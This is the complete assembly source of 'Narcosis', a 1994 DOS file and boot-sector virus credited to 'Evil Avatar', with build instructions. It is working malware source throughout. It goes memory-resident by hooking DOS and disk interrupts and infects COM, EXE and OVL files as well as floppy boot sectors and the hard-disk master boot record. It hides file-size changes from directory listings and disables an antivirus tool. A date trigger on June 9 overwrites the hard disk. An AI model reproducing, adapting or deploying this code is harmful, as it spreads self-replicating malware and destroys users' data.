comment #
                           Source code of Narcosis
         
                               by Evil Avatar
#

;============================================================
;
;       Narcosis Virus
;       (c) 1994 Evil Avatar
;
; TASM /M3 NARCOSIS
; TLINK /X NARCOSIS
; EXE2BIN NARCOSIS NARCOSIS.COM

.model tiny
.code
org 0

ID      equ 666h
VMEM    equ (Virus_end-Narcosis+15)/16+1
VSIZEK  equ (Virus_end-Narcosis+1023)/1024
V_FILE  equ (heap-Narcosis)

;=====( Entry point for COM/EXE files )====================================

Narcosis:
        sbb bl, byte ptr ds:[0]         ;new stealth technique
        mov ax, 0fa01h
        mov dx, 5945h
        int 16h                         ;disable MSAV
        push ds                         ;save PSP segment
        call delta
bye_bye:
        jmp format
delta:  pop bp
        sub bp, offset bye_bye          ;get delta offset
        mov ah, 2ah
        int 21h                         ;check the date
        cmp dx, 609h                    ;is it June 9th?
        je bye_bye                      ;yes? say your prayers lamer
        mov ah, 30h
        mov bx, ID
        int 21h                         ;installation check
        cmp al, 3                       ;are we installed?
        jb install_done                 ;why yes, yes we are!
        mov ax, ds
        dec ax                          ;get MCB segment
        mov ds, ax                      ;move MCB segment into ds
        cmp byte ptr ds:[0], 'Z'        ;is it last MCB in chain?
        jnz install_done                ;no? don't install self
        sub word ptr ds:[3], VMEM       ;shrink host allocation
        sub word ptr ds:[12h], VMEM     ;alter PSP memory size field
        mov es, word ptr ds:[12h]       ;get new virus segment
        sub ax, ax
        mov ds, ax                      ;BIOS data table/IVT
        sub byte ptr ds:[413h], VSIZEK  ;shrink memory size (int 12h)
        push es                         ;save virus segment
        les bx, dword ptr ds:[13h*4]    ;get int 13h vector
        mov word ptr ss:[bp+save_13], bx
        mov word ptr ss:[bp+save_13+2], es      ;save int 13h vector
        les bx, dword ptr ds:[21h*4]    ;get int 21h vector
        mov word ptr ss:[bp+save_21], bx
        mov word ptr ss:[bp+save_21+2], es      ;save int 21h vector
        pop es                          ;get virus segment
        push cs
        pop ds                          ;ds now equals cs
        lea si, [bp+offset Narcosis]    ;start of virus code
        sub di, di
        push di
        mov cx, (Virus_end-Narcosis)/2  ;size of virus in words
        rep movsw                       ;copy virus to upper memory
        call infect_hd
        pop ds
        cli                             ;clear interrupts
        mov word ptr ds:[13h*4], offset int13
        mov word ptr ds:[13h*4+2], es   ;set new int 13h vector
        mov word ptr ds:[21h*4], offset int21
        mov word ptr ds:[21h*4+2], es   ;set new int 21h vector
        sti                             ;allow interrupts
install_done:
        mov ax, 4541h
        mov bx, 4541h
        int 21h                         ;infect a file
        push ds                         ;restore PSP segment
        pop es                          ;in both ds and es
        sub bx, bx                      ;clear ID so host won't
                                        ;accidently use it
        cmp sp, 0deadh                  ;is this an .exe file?
        jne return_com                  ;no? restore com stuff
        push es
        pop ds
        mov ax, es                      ;ax=PSP segment
        add ax, 10h                     ;adjust for PSP size
        add word ptr cs:[bp+comsave+2], ax      ;set up cs
        add ax, word ptr cs:[bp+ss_sp]          ;set up ss
        cli                             ;clear ints for stack manipulation
        mov ss, ax                      ;set ss
        mov sp, word ptr [bp+ss_sp+2]   ;set sp
        sti                             ;restore ints
        jmp dword ptr cs:[bp+comsave]   ;jump to old program
return_com:
        push cs          ;needed?
        pop ds                          ;ds=cs
        push cs          ;needed?
        pop es                          ;es=cs
        mov di, 100h                    ;beginning of program
        push di                         ;for later return
        lea si, [bp+comsave]            ;first 3 bytes of program
        movsb
        movsw                           ;restore first 3 bytes
        ret                             ;return to program

;=====( Entry point after boot sector retf )===============================

high_code:
        push ds
        mov di, 7c00h
        push di
        mov si, offset buffer
        push ds
        pop es
        push cs
        pop ds
        mov cx, 100h           ;not very optimised
        rep movsw
        push es
        pop ds
        push cs
        pop es
        push ds
        cmp dx, 80h
        je next
        push dx
        call infect_hd
        pop dx
next:   pop ds
        mov word ptr cs:[int13b+1], 0
        les bx, dword ptr ds:[13h*4]
        mov word ptr cs:[save_13], bx
        mov word ptr cs:[save_13+2], es
        cli
        mov word ptr ds:[13h*4], offset int13b
        mov word ptr ds:[13h*4+2], cs
        sti
        retf

;=====( Check file extension )=============================================

check_ext:
        call push_all
        mov si, dx
find:   lodsb
        cmp al, '.'
        je found_ext
        cmp al, 0
        jne find
done_ext:        
        call pop_all
        jmp dos21
found_ext:
        lodsb
        and al, 5fh
        mov bl, al
        lodsw
        and ax, 5f5fh
        cmp bl, 'C'
        je maybe_com
        cmp bl, 'E'
        je maybe_exe
        cmp bl, 'O'
        jne done_ext
        cmp ax, 'LV'
        je infect2
        jmp done_ext
maybe_com:
        cmp ax, 'MO'
        je infect2
        jmp done_ext
maybe_exe:
        cmp ax, 'EX'
        je infect2
        jmp done_ext
infect2:
        jmp infect_file2

;=====( Interrupt 21h handler )============================================

int21:  cmp ah, 30h                     ;installation check
        je install_check
        cmp ah, 11h                     ;find first
        je stealth_dir                  ;stealth
        cmp ah, 12h                     ;find next
        je stealth_dir                  ;stealth
        cmp ah, 4bh                     ;execute
        je _infect                      ;infect it
        cmp ah, 3dh                     ;open
        je check_ext                    ;infect it
        cmp ah, 41h                     ;delete
        je check_ext                    ;infect it
        cmp ah, 56h                     ;rename
        je check_ext                    ;infect it
        cmp ah, 43h                     ;attribs
        je check_ext                    ;infect it
        cmp ax, 4541h
        je go_infect
dos21:  jmp dword ptr cs:[save_21]      ;jump to DOS int 21h
_infect:
        jmp infect_file

;=====( Install check )====================================================

install_check:
        cmp bx, ID                      ;did virus call?
        jne dos21                       ;no? call original interrupt
        mov al, 2                       ;set return code
        iret                            ;return

;=====( Dir stealth )======================================================

stealth_dir:
        pushf
        call dword ptr cs:[save_21]
        call push_all
        test al, al
        jnz no_stealth
        mov ah, 51h
        int 21h
        mov es, bx
        cmp bx, es:[16h]
        jne no_stealth
        mov ah, 2fh
        int 21h
        cmp byte ptr ds:[bx], -1
        jne not_extended
        add bx, 7
not_extended:
        cmp word ptr ds:[bx+19h], 0c800h
        jb no_stealth
        sub ds:[bx+19h], 0c800h
        sub ds:[bx+1dh], V_FILE
        sbb word ptr ds:[bx+1fh], 0
no_stealth:
        call pop_all
        iret

;=====( Direct infection routine )=========================================

go_infect:
        sub ax, bx
        jnz dos21
        push es
        pop ds
        mov byte ptr ds:[scratch], 0
        mov dx, offset newDTA
        mov ah, 1ah
        call call21
        mov ah, 4eh
get_file:
        mov dx, offset files
        mov cx, 7
        call call21
        jc no_more
        mov ax, 3d00h
        mov dx, offset newDTA+1eh
        int 21h
        xchg ax, bx
        mov ah, 3eh
        call call21
        cmp byte ptr ds:[scratch], 1
        je no_more
        mov ah, 4fh
        jmp get_file
no_more:
        pop bx es ax ds
        push ax es bx
        mov dx, 80h
        mov ah, 1ah
        call call21
        iret

;=====( File infection routine )===========================================

infect_file: 
        call push_all
infect_file2:
        push ds
        
        sub ax, ax
        mov ds, ax                      ;interrupt vector table
        les bx, dword ptr ds:[24h*4]    ;get int 24h vector
        mov word ptr cs:[save_24], bx
        mov word ptr cs:[save_24+2], es ;save it
        mov word ptr ds:[24h*4], offset int24
        mov word ptr ds:[24h*4+2], cs   ;set new int 24h
        pop ds        
        mov ah, 3dh
        call call21                     ;open file read only
        push ax                         ;save handle
        mov bx, 1220h
        xchg ax, bx                     ;put handle in bx
        int 2fh                         ;get job file table
        mov ax, 1216h
        sub bx, bx
        mov bl, byte ptr es:[di]        ;get sft number for file handle
        int 2fh                         ;get address of sft
        mov word ptr es:[di+2], 2       ;set read/write
        pop bx                          ;restore handle
        push cs
        pop ds                          ;set ds for code segment reference
        mov ah, 3fh
        mov cx, 1ah
        mov dx, offset buffer
        call call21                     ;read first 1ah bytes
        mov cx, word ptr es:[di+0dh]    ;get time
        mov dx, word ptr es:[di+0fh]    ;get date
        cmp dx, 0c800h                  ;check 100 years
        jae bad_date                    ;if so, already infect
        push cx dx es di                ;save time and date

        mov ax, word ptr es:[di+11h]
        mov dx, word ptr es:[di+13h]
        mov word ptr es:[di+15h], ax
        mov word ptr es:[di+17h], dx
        
        cmp word ptr ds:[buffer], 'ZM'
        je exe_file
        cmp word ptr ds:[buffer], 'MZ'
        je exe_file                     ;if .exe file then infect it

        or dx, dx
        jnz bad_file
        cmp ax, 65535-(Virus_end-Narcosis)
        jnb bad_file
        cmp ax, 400h
        jb bad_file
        push cs
        pop es
        mov si, offset buffer
        mov di, offset comsave
        movsb
        movsw                           ;move combytes to comsave

        sub ax, 3
        mov byte ptr ds:[buffer], 0e9h
        mov word ptr ds:[buffer+1], ax  ;set up jump

        jmp write_virus
bad_file:
        add sp, 8
bad_date:
        jmp close
exe_file:
        cmp word ptr ds:[buffer+12], -1
        jne bad_file
        push bx ax dx cs                ;save handle
        pop es
        mov si, offset buffer+0eh
        mov di, offset ss_sp
        cld
        movsw        
        movsw
        inc si
        inc si
        movsw
        movsw

        add word ptr ds:[buffer+0ah], VMEM      ;new minimum memory
        
        mov ax, word ptr ds:[buffer+8]  ;get header size
        mov cl, 4
        shl ax, cl                      ;change to bytes
        xchg ax, cx                     ;save it

        pop dx ax
        push ax
        push dx                         ;save file size
        
        sub ax, cx
        sbb dx, 0                       ;get new cs:ip
        
        mov cx, 10h
        div cx
        
        mov word ptr ds:[buffer+16h], ax        ;set virus cs
        mov word ptr ds:[buffer+14h], dx        ;set virus ip
        
        mov word ptr ds:[buffer+0eh], ax        ;set virus ss
        mov word ptr ds:[buffer+10h], 0deadh    ;set virus sp
        
        pop dx
        pop ax                          ;get file size
        add ax, (heap-Narcosis)
        adc dx, 0                       ;add virus size
        
        mov cx, 200h                    
        div cx                          ;convert to pages
        push ax                         ;save it
        or dx, dx                       ;check for remainder
        je no_remainder                 ;no? skip it
        inc ax                          ;increment number of pages
no_remainder:        
        mov word ptr ds:[buffer+4], ax  ;save number of pages
        pop ax
        and ah, 1
        mov word ptr ds:[buffer+2], ax  ;file size MOD 512
        pop bx
write_virus:
        pop di es
        mov ah, 40h
        mov cx, V_FILE
        cwd
        call call21                     ;write virus to EOF
        mov word ptr es:[di+15h], 0
        mov word ptr es:[di+17h], 0
        mov ah, 40h
        mov cx, 1ah                     ;restore buffer size
        mov dx, offset buffer
        call call21                     ;write header or jump

        mov ax, 5701h
        pop dx cx
        add dx, 0c800h                  ;add 100 years
        call call21                     ;set file time and date
        mov byte ptr ds:[scratch], 1

close:  mov ah, 3eh
        call call21                     ;close file

        sub ax, ax
        mov ds, ax                      ;interrupt vector table
        les dx, dword ptr cs:[save_24]  ;get int 24h vector
        mov word ptr ds:[24h*4], dx
        mov word ptr ds:[24h*4+2], es   ;restore old int 24h vector
        
        call pop_all
        jmp dos21                       ;return to caller

;=====( Boot Sector )======================================================

bootsec:
        jmp loader
        xchg ax, ax
bootparms:
newDTA  db 2bh dup (?)
scratch db 10h dup (?)
loader: 
        sub ax, ax
        mov ds, ax
        cli
        mov ss, ax
        mov sp, 7c00h
        sti
        sub word ptr ds:[413h], (virus_end-narcosis+1023)/1024
        mov bx, word ptr ds:[413h]
        mov cl, 6
        shl bx, cl
        mov es, bx
        mov ax, 200h+(heap2-narcosis+511)/512
        sub bx, bx
        mov cx, 2701h
sector  equ $-2
        int 13h
        push dx
        mov ah, 4
        int 1ah
        cmp dx, 609h
        je format
        pop dx
        push es
        mov ax, offset high_code
        push ax
        retf
sig     db 'EA', 0
format: mov bx, 5000h
        mov es, bx
        mov dx, 80h
next_head:
        sub ax, ax
        mov cx, 1
        int 13h
next_track:
        mov ax, 309h
        int 13h
        inc ch
        and ch, 40h
        jne next_track
        inc dh
        jmp next_head
loader_end:

;=====( Infect master boot record )========================================

infect_hd:
        push es
        pop ds
        mov ax, 201h
        mov bx, offset buffer
        mov cx, 1
        mov dx, 80h
        int 13h                         ;read in master boot record
        cmp word ptr ds:[buffer+(sig-loader)], 'AE'
        je infected
        mov ax, 301h
        mov bx, offset buffer
        mov cx, 2
        mov dx, 80h
        int 13h                         ;write mbr to sector 2
        mov ax, 300h+(heap2-narcosis+1ffh)/200h
        sub bx, bx
        mov cx, 3
        mov dx, 80h
        int 13h                         ;write virus after partition table
        mov word ptr ds:[sector], 3
        mov di, offset buffer
        mov si, offset loader
        mov cx, (offset loader_end-offset loader)/2
        rep movsw                       ;copy loader onto boot code
        mov ax, 301h
        mov bx, offset buffer
        mov cx, 1
        mov dx, 80h
        int 13h                         ;write infected master boot record
infected:
        retn

;=====( Interrupt 13h handler )============================================

int13:  cmp ah, 2
        je infect_disk
        cmp ah, 3
        je infect_disk
bios13: jmp dword ptr cs:[save_13]
int13b: db 0e9h, 0, 0
        call push_all
        std
        sub ax, ax
        mov es, ax
        lds bx, dword ptr es:[21h*4]
        mov ax, ds
        cmp ax, 800h
        ja done13
        push cs
        pop ds
        mov di, offset save_21+2
        xchg ax, word ptr ds:[di]
        scasw
        je done13
        mov word ptr ds:[di], bx
        cli
        mov word ptr es:[21h*4], offset int21
        mov word ptr es:[21h*4+2], cs
        sti
        mov word ptr ds:[int13b+1], -((int13b-int13)+3)
done13: call pop_all
        jmp int13

;=====( Disk infection routine )===========================================

infect_disk:
        mov word ptr cs:[scratch], dx
        pushf
        call dword ptr cs:[save_13]
        push ax
        push si
        pushf
        mov si, sp
        mov ax, word ptr ss:[si]
        mov word ptr ss:[si+10], ax
        popf
        pop si
        pop ax
        call push_all                   ;save all the registers
        jc no_infect
        push cs cs
        pop ds es                       ;make ds, es equal cs
        mov dx, word ptr ds:[scratch]
        cmp dx, 80h                     ;is it a hard disk?
        jae no_infect                   ;yes? see if a boot sector read
        mov ax, 201h
        mov bx, offset buffer
        mov cx, 1
        call call13                     ;read boot sector from disk
        jc reset
sig_check:        
        cmp word ptr ds:[buffer+(sig-bootsec)], 'AE'
        je no_infect
        
        mov si, offset buffer+3
        mov di, offset bootparms
        mov cx, 3bh
        rep movsb                       ;copy parameters to our boot block
        mov ax, 301h
        mov bx, offset bootsec
        mov cx, 1
        mov word ptr ds:[sector], 2701h
        call call13                     ;write boot sector to disk
        jc no_infect
        mov ax, 300h+((heap2-narcosis+511)/512)
        sub bx, bx
        mov cx, 2701h
        call call13                     ;write virus to disk
        jmp no_infect
reset:  sub ax, ax
        call call13
        mov ax, 201h
        mov bx, offset buffer
        mov cx, 1
        call call13
        jnc sig_check
no_infect:
        call pop_all
        iret

;=====( Fake an int 13h call )=============================================

call13: pushf
        call dword ptr cs:[save_13]
        retn

;=====( Fake an int 21h call )=============================================

call21: pushf
        call dword ptr cs:[save_21]
        retn

;=====( Interrupt 24h handler )============================================

int24:  iret                            ;just return

;=====( Push all registers )===============================================

push_all:
        pop word ptr cs:[p_all]         ;save return address
        push ax bx cx dx bp si di ds es ;save registers
        pushf                           ;save flags
        jmp word ptr cs:[p_all]         ;return to caller

;=====( Pop all registers )================================================

pop_all:
        pop word ptr cs:[p_all]         ;save return address
        popf                            ;restore flags
        pop es ds di si bp dx cx bx ax  ;restore registers
        jmp word ptr cs:[p_all]         ;return to caller

;=====( End of boot sector )===============================================

ss_sp   dd 0                            ;old stack pointer
comsave db 0cdh, 20h, 0, 0
files   db '*.*', 0
bs_end:
db 1feh-(bs_end-bootsec) dup (?)
dw 0aa55h

;=====( Virus data area )==================================================

virus   db '[Narcosis]', 0
author  db '(c) 1994 Evil Avatar', 0
heap:                                   ;discardable variables
buffer  db 200h dup (?)                 ;buffer for file/disk reads
heap2:                                  ;save the boot sector
p_all   dw ?                            ;push/pop all return address
save_13 dd ?                            ;int 13h entry
save_21 dd ?                            ;int 21h entry
save_24 dd ?                            ;int 24h entry
Virus_end:

end Narcosis
